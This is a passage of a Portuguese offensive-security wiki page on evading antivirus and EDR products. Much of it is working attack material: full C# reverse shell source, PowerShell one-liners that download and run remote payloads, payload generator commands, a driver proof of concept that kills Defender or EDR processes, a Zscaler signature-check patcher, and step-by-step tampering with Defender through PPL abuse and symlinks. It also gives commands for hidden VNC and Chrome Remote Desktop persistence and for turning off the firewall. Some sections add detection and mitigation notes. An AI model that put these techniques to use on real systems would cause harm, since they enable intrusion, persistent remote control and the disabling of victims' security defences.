-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aqui está uma demonstração de bypass do SmartScreen empacotando payloads dentro de arquivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de logging no Windows que permite que aplicações e componentes do sistema **registrem eventos**. No entanto, ele também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

Semelhante a como o AMSI é desativado (bypassed), também é possível fazer com que a função **`EtwEventWrite`** do processo em user space retorne imediatamente sem registrar nenhum evento. Isso é feito aplicando patch na função em memória para retornar imediatamente, desativando efetivamente o logging do ETW para aquele processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Carregar binários C# em memória é algo conhecido há bastante tempo e ainda é uma ótima maneira de executar suas ferramentas de post-exploitation sem ser pego pelo AV.

Como o payload será carregado diretamente na memória sem tocar o disco, só precisaremos nos preocupar em aplicar patch no AMSI para todo o processo.

A maioria dos frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) já fornece a capacidade de executar assemblies C# diretamente na memória, mas há diferentes maneiras de fazer isso:

- **Fork\&Run**

Isso envolve **criar um novo processo sacrificial**, injetar seu código malicioso de post-exploitation nesse novo processo, executar seu código malicioso e, quando terminar, matar o novo processo. Isso tem tanto benefícios quanto desvantagens. O benefício do método fork and run é que a execução ocorre **fora** do processo do nosso Beacon implantado. Isso significa que, se algo na nossa ação de post-exploitation der errado ou for detectado, há uma **chance muito maior** de nosso **implant sobreviver.** A desvantagem é que você tem uma **chance maior** de ser pego por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de post-exploitation **no próprio processo**. Dessa forma, você evita criar um novo processo e vê-lo ser escaneado pelo AV, mas a desvantagem é que, se algo der errado com a execução do seu payload, há uma **chance muito maior** de **perder seu beacon**, pois ele pode travar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se você quiser ler mais sobre carregamento de C# Assembly, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o BOF InlineExecute-Assembly deles ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar C# Assemblies **a partir do PowerShell**, confira [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e [o vídeo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Como proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens, dando à máquina comprometida acesso **ao ambiente do interpretador instalado no share SMB controlado pelo Attacker**.

Ao permitir acesso aos Interpreter Binaries e ao ambiente no share SMB, você pode **executar código arbitrário nessas linguagens dentro da memória** da máquina comprometida.

O repo indica: Defender ainda escaneia os scripts, mas ao usar Go, Java, PHP etc. temos **mais flexibilidade para bypassar static signatures**. Testes com scripts aleatórios de reverse shell sem obfuscação nessas भाषas mostraram sucesso.

## TokenStomping

Token stomping é uma técnica que permite a um atacante **manipular o access token ou um security prouct como um EDR ou AV**, permitindo reduzir seus privilégios para que o processo não morra, mas não tenha permissões para verificar atividades maliciosas.

Para evitar isso, o Windows poderia **impedir processos externos** de obter handles sobre os tokens de processos de segurança.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como descrito em [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é fácil implantar o Chrome Remote Desktop em um PC da vítima e depois usá-lo para assumir o controle e manter persistence:
1. Baixe em https://remotedesktop.google.com/, clique em "Set up via SSH" e depois clique no arquivo MSI para Windows para baixar o arquivo MSI.
2. Execute o installer silenciosamente na vítima (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volte para a página do Chrome Remote Desktop e clique em next. O wizard então pedirá autorização; clique no botão Authorize para continuar.
4. Execute o parâmetro fornecido com alguns ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Observe o parâmetro pin, que permite definir o pin sem usar a GUI).


## Advanced Evasion

Evasion é um tópico muito complicado; às vezes você precisa levar em conta muitas fontes diferentes de telemetry em um único sistema, então é praticamente impossível permanecer completamente indetectável em ambientes maduros.

Cada ambiente contra o qual você atua terá seus próprios pontos fortes e fracos.

Eu recomendo fortemente que você assista a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94), para obter um ponto de entrada em técnicas mais Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Também há outra ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Você pode usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **removerá partes do binário** até **descobrir qual parte o Defender** está marcando como maliciosa e separá-la para você.\
Outra ferramenta fazendo a **mesma coisa é** [**avred**](https://github.com/dobin/avred), com uma oferta web aberta do serviço em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Até o Windows10, todos os Windows vinham com um **Telnet server** que você podia instalar (como administrator) fazendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que ele **inicie** quando o sistema for iniciado e **execute** agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar a porta telnet** (stealth) e desativar o firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Baixe em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads bin, não o setup)

**NO HOST**: Execute _**winvnc.exe**_ e configure o server:

- Ative a opção _Disable TrayIcon_
- Defina uma password em _VNC Password_
- Defina uma password em _View-Only Password_

Depois, mova o binary _**winvnc.exe**_ e o arquivo _**novo**_ criado _**UltraVNC.ini**_ para dentro do **victim**

#### **Reverse connection**

O **attacker** deve **executar dentro** do seu **host** o binary `vncviewer.exe -listen 5900` para que ele fique **preparado** para capturar uma reverse **VNC connection**. Então, dentro do **victim**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Para manter stealth você não deve fazer algumas coisas

- Não inicie `winvnc` se ele já estiver rodando, ou você vai disparar um [popup](https://i.imgur.com/1SROTTl.png). verifique se ele está rodando com `tasklist | findstr winvnc`
- Não inicie `winvnc` sem `UltraVNC.ini` no mesmo diretório, ou isso fará com que [a config window](https://i.imgur.com/rfMQWcf.png) seja aberta
- Não execute `winvnc -h` para ajuda, ou você vai disparar um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Baixe em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **xml payload** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O defensor atual vai encerrar o processo muito rápido.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro C# Revershell

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use-o com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscators C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para exemplos de build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 aproveitou uma pequena utilidade de console conhecida como **Antivirus Terminator** para desabilitar proteções de endpoint antes de soltar ransomware. A ferramenta traz seu **próprio driver vulnerável, mas *signed***, e o abusa para emitir operações privilegiadas de kernel que até serviços AV Protected-Process-Light (PPL) não conseguem bloquear.

Principais pontos
1. **Signed driver**: O arquivo entregue em disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente signed `AToolsKrnl64.sys` do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver tem uma assinatura válida da Microsoft, ele carrega mesmo quando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalação do serviço**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
A primeira linha registra o driver como um **kernel service** e a segunda o inicia para que `\\.\ServiceMouse` fique acessível a partir do user land.
3. **IOCTLs expostos pelo driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Prova de conceito mínima em C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por que funciona**:  BYOVD ignora completamente as proteções de user-mode; código executado no kernel pode abrir processos *protected*, encerrá-los ou adulterar objetos do kernel independentemente de PPL/PP, ELAM ou outros recursos de hardening.

Detection / Mitigation
•  Habilite a block list de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows recuse carregar `AToolsKrnl64.sys`.
•  Monitore a criação de novos serviços de *kernel* e alerte quando um driver for carregado de um diretório world-writable ou não estiver na allow-list.
•  Observe handles de user-mode para custom device objects seguidos de chamadas suspeitas de `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

O **Client Connector** da Zscaler aplica regras de device-posture localmente e depende de Windows RPC para comunicar os resultados a outros componentes. Duas escolhas de design fracas tornam possível um bypass total:

1. A avaliação de posture acontece **inteiramente no lado do cliente** (um boolean é enviado ao servidor).
2. Os endpoints internos de RPC validam apenas que o executável que se conecta está **signed by Zscaler** (via `WinVerifyTrust`).

Ao **patchar quatro binaries signed em disco** ambos os mecanismos podem ser neutralizados:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Trecho mínimo do patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **All** posture checks display **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.

This case study demonstrates how purely client-side trust decisions and simple signature checks can be defeated with a few byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) impõe uma hierarquia de signer/level para que apenas processos protegidos de nível igual ou superior possam interferir uns com os outros. Offensive, if you can legitimately launch a PPL-enabled binary and control its arguments, you can convert benign functionality (e.g., logging) into a constrained, PPL-backed write primitive against protected directories used by AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- O binário de sistema assinado `C:\Windows\System32\ClipUp.exe` se auto-inicia e aceita um parâmetro para escrever um arquivo de log em um caminho especificado pelo chamador.
- Quando iniciado como um processo PPL, a gravação do arquivo ocorre com backing PPL.
- ClipUp não consegue interpretar caminhos contendo espaços; use caminhos curtos 8.3 para apontar para locais normalmente protegidos.

8.3 short path helpers
- Listar nomes curtos: `dir /x` em cada diretório pai.
- Derivar caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Inicie o LOLBIN capaz de PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um launcher (por exemplo, CreateProcessAsPPL).
2) Passe o argumento de caminho de log do ClipUp para forçar a criação de um arquivo em um diretório protegido do AV (por exemplo, Defender Platform). Use nomes curtos 8.3 se necessário.
3) Se o binário alvo normalmente estiver aberto/bloqueado pelo AV enquanto estiver em execução (por exemplo, MsMpEng.exe), agende a gravação no boot antes de o AV iniciar instalando um serviço de auto-start que execute de forma confiável mais cedo. Valide a ordem de boot com Process Monitor (boot logging).
4) Na reinicialização, a gravação com backing PPL acontece antes que o AV bloqueie seus binários, corrompendo o arquivo alvo e impedindo a inicialização.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas e restrições
- Você não pode controlar o conteúdo que o ClipUp escreve além do posicionamento; o primitive é adequado para corrupção, não para injeção precisa de conteúdo.
- Requer local admin/SYSTEM para instalar/iniciar um serviço e uma janela de reboot.
- O timing é crítico: o alvo não pode estar aberto; execução no boot evita locks de arquivo.

Detecções
- Criação de processo do `ClipUp.exe` com argumentos incomuns, especialmente quando iniciado por launchers não padrão, próximo ao boot.
- Novos serviços configurados para auto-start de binários suspeitos e iniciando consistentemente antes do Defender/AV. Investigue criação/modificação de serviço antes de falhas no startup do Defender.
- Monitoramento de integridade de arquivos nos binários do Defender/diretórios Platform; criações/modificações inesperadas por processos com flags de protected-process.
- Telemetria ETW/EDR: procure processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de níveis de PPL por binários que não sejam AV.

Mitigações
- WDAC/Code Integrity: restrinja quais binários assinados podem executar como PPL e sob quais parents; bloqueie a invocação do ClipUp fora de contextos legítimos.
- Higiene de serviços: restrinja a criação/modificação de serviços auto-start e monitore manipulação da ordem de inicialização.
- Garanta que Defender tamper protection e as proteções de early-launch estejam habilitadas; investigue erros de startup que indiquem corrupção de binário.
- Considere desabilitar a geração de short-name 8.3 em volumes que hospedam tooling de segurança, se isso for compatível com seu ambiente (teste cuidadosamente).

Referências para PPL e tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

O Windows Defender escolhe a plataforma da qual executa enumerando subpastas em:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Ele seleciona a subpasta com a maior string de versão lexicográfica (por exemplo, `4.18.25070.5-0`), e então inicia os processos de serviço do Defender a partir dali (atualizando os caminhos do service/registry conforme necessário). Essa seleção confia nas entradas de diretório, incluindo reparse points de diretório (symlinks). Um administrador pode explorar isso para redirecionar o Defender para um caminho gravável pelo atacante e obter DLL sideloading ou interrupção do serviço.

Pré-condições
- Local Administrator (necessário para criar diretórios/symlinks sob a pasta Platform)
- Capacidade de reboot ou de acionar nova seleção da plataforma do Defender (reinício do serviço no boot)
- Apenas ferramentas nativas necessárias (mklink)

Por que funciona
- O Defender bloqueia writes em suas próprias pastas, mas a seleção da plataforma confia nas entradas de diretório e escolhe a versão lexicograficamente mais alta sem validar se o target resolve para um caminho protegido/confiável.

Passo a passo (exemplo)
1) Prepare um clone gravável da pasta de plataforma atual, por exemplo `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crie um symlink de diretório de versão mais alta dentro de Platform apontando para sua pasta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Disparar a seleção (reboot recomendado):
```cmd
shutdown /r /t 0
```
4) Verifique se o MsMpEng.exe (WinDefend) executa a partir do caminho redirecionado:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Você deve observar o novo path do processo em `C:\TMP\AV\` e a configuração do serviço/registry refletindo esse local.

Opções de post-exploitation
- DLL sideloading/code execution: Solte/substitua DLLs que o Defender carrega do diretório da aplicação dele para executar código nos processos do Defender. Veja a seção acima: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remova o version-symlink para que, na próxima inicialização, o path configurado não seja resolvido e o Defender falhe ao iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Observe que esta técnica não fornece escalada de privilégios por si só; ela requer direitos de administrador.

## API/IAT Hooking + Call-Stack Spoofing com PIC (estilo Crystal Kit)

Red teams podem mover a evasão em runtime do implant C2 para o próprio módulo alvo, fazendo hook da sua Import Address Table (IAT) e roteando APIs selecionadas por meio de código position-independent (PIC) controlado pelo atacante. Isso generaliza a evasão além da pequena superfície de API que muitos kits expõem (por exemplo, CreateProcessA) e estende as mesmas proteções para BOFs e DLLs de post-exploitation.

Abordagem de alto nível
- Carregue um blob PIC ao lado do módulo alvo usando um reflective loader (prependido ou companion). O PIC deve ser autossuficiente e position-independent.
- Conforme a DLL host é carregada, percorra seu IMAGE_IMPORT_DESCRIPTOR e faça patch nas entradas da IAT para imports alvo (por exemplo, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para apontar para wrappers PIC leves.
- Cada wrapper PIC executa evasions antes de fazer tail-call para o endereço real da API. Evasions típicas incluem:
- Memory mask/unmask em torno da chamada (por exemplo, criptografar regiões do beacon, RWX→RX, alterar nomes/permissões de páginas) e depois restaurar após a chamada.
- Call-stack spoofing: construir uma stack benigna e transicionar para a API alvo para que a análise de call-stack resolva para frames esperados.
- Para compatibilidade, exponha uma interface para que um script do Aggressor (ou equivalente) possa registrar quais APIs devem ser hooked para Beacon, BOFs e post-ex DLLs.

Por que usar IAT hooking aqui
- Funciona para qualquer código que use o import hooked, sem modificar o código da ferramenta nem depender do Beacon para proxy de APIs específicas.
- Cobre DLLs de post-ex: fazer hook de LoadLibrary* permite interceptar carregamentos de módulos (por exemplo, System.Management.Automation.dll, clr.dll) e aplicar a mesma evasão de masking/stack às suas chamadas de API.
- Restaura o uso confiável de comandos de post-ex que iniciam processos contra detecções baseadas em call-stack, ao encapsular CreateProcessA/W.

Esboço mínimo de hook IAT (x64 pseudocode C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplique o patch após relocations/ASLR e antes do primeiro uso do import. Reflective loaders como TitanLdr/AceLdr demonstram hooking durante o DllMain do módulo carregado.
- Mantenha wrappers pequenos e PIC-safe; resolva a verdadeira API via o valor original da IAT que você capturou antes do patching ou via LdrGetProcedureAddress.
- Use transições RW → RX para PIC e evite deixar páginas writable+executable.

Call‑stack spoofing stub
- PIC stubs estilo Draugr constroem uma call chain falsa (return addresses para módulos benignos) e então fazem pivot para a API real.
- Isso contorna detecções que esperam stacks canônicos de Beacon/BOFs para APIs sensíveis.
- Combine com stack cutting/stack stitching techniques para aterrissar dentro de frames esperados antes do prologue da API.

Integração operacional
- Prepend o reflective loader aos DLLs post-ex para que o PIC e os hooks inicializem automaticamente quando o DLL for carregado.
- Use um Aggressor script para registrar APIs alvo, de modo que Beacon e BOFs se beneficiem transparentemente do mesmo caminho de evasão sem mudanças de código.

Considerações de detecção/DFIR
- Integridade da IAT: entradas que resolvem para endereços non-image (heap/anon); verificação periódica de ponteiros de import.
- Anomalias de stack: return addresses que não pertencem a imagens carregadas; transições abruptas para PIC non-image; ancestrais inconsistentes de RtlUserThreadStart.
- Telemetria de loader: writes in-process na IAT, atividade precoce de DllMain que modifica import thunks, regiões RX inesperadas criadas no load.
- Evasão de image-load: se estiver hookando LoadLibrary*, monitore loads suspeitos de automação/assemblies clr correlacionados com eventos de memory masking.

Blocos de construção e exemplos relacionados
- Reflective loaders que fazem IAT patching durante o load (por exemplo, TitanLdr, AceLdr)
- Memory masking hooks (por exemplo, simplehook) e PIC de stack cutting (stackcutting)
